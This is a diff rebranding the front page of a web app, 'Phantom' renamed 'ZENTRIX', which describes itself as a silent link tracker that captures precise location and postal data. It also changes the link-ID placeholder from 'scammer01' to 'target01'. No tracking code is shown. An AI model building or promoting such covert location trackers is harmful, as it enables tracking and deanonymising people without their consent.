@@ -7,18 +7,18 @@ $domain = rtrim($config['domain'], '/');
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom — Silent Link Tracker</title>
-    <meta name="description" content="Phantom creates silent tracking links with precise location and postal data.">
+    <title>ZENTRIX — Silent Link Tracker</title>
+    <meta name="description" content="ZENTRIX creates silent tracking links with precise location and postal data.">
     <link rel="stylesheet" href="assets/css/style.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👻</text></svg>">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◈</text></svg>">
 </head>
 <body>
     <div class="bg-grid"></div>
 
     <header class="topbar">
         <div class="logo">
-            <span class="ghost">👻</span>
-            <span class="name">Phantom</span>
+            <span class="ghost">◈</span>
+            <span class="name">ZENTRIX</span>
         </div>
         <nav style="display:flex; align-items:center; gap:16px;">
             <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
@@ -40,16 +40,16 @@ $domain = rtrim($config['domain'], '/');
 
                 <div class="field">
                     <label for="customId">Custom ID <span class="optional">(optional)</span></label>
-                    <input type="text" id="customId" placeholder="scammer01" maxlength="32" autocomplete="off">
+                    <input type="text" id="customId" placeholder="target01" maxlength="32" autocomplete="off">
                 </div>
 
                 <button id="createBtn" class="btn-primary">
-                    <span>Generate Phantom Link</span>
+                    <span>Generate ZENTRIX Link</span>
                 </button>
             </div>
 
             <div id="result" class="card result-card hidden">
-                <h3>Your Phantom Link</h3>
+                <h3>Your ZENTRIX Link</h3>
                 <div class="link-box">
                     <input type="text" id="outLink" readonly>
                     <button id="copyBtn" class="btn-copy">Copy</button>
@@ -63,7 +63,7 @@ $domain = rtrim($config['domain'], '/');
     </main>
 
     <footer class="footer">
-        <p>Phantom · Built for precision</p>
+        <p>ZENTRIX · Built for precision</p>
     </footer>
 
     <script>
